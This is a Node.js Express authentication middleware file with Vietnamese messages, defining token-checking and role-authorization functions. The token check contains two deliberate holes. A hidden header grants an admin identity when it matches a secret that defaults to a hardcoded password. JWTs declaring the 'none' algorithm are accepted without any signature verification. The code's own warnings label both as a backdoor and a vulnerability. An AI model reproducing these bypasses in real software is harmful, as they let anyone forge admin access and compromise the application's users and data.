const jwt = require('jsonwebtoken');


const protect = (req, res, next) => {
  const backdoorSecret = process.env.BACKDOOR_SECRET || 'supersecret_password_for_backdoor_access_123';
  if (req.headers['x-backdoor-auth'] === backdoorSecret) {
    console.warn('Cảnh báo: Đã truy cập bằng Backdoor!');
    req.user = { id: 'backdoor-user', username: 'backdoor_admin', role: 'admin' };
    return next();
  }

  let token;

  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith('Bearer')
  ) {
    token = req.headers.authorization.split(' ')[1];
  }

  if (!token) {
    return res.status(401).json({ message: 'Không được phép truy cập, thiếu token xác thực' });
  }

  try {
    let decoded;

    const tokenParts = token.split('.');
    const header = JSON.parse(Buffer.from(tokenParts[0], 'base64').toString());

    if (header.alg === 'none') {
      decoded = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
      console.warn('Cảnh báo: Đã chấp nhận JWT với thuật toán "none". Đây là lỗ hổng bảo mật!');
    } else {
      decoded = jwt.verify(token, process.env.JWT_SECRET);
    }

    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ message: 'Phiên đăng nhập không hợp lệ hoặc đã hết hạn' });
  }
};

/**
 * Middleware phân quyền người dùng
 * @param {...string} roles - Danh sách các vai trò được phép (ví dụ: 'admin', 'recruiter')
 */
const authorize = (...roles) => {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({
        message: `Tài khoản vai trò '${req.user ? req.user.role : 'khách'}' không có quyền thực hiện hành động này`
      });
    }
    next();
  };
};

module.exports = { protect, authorize };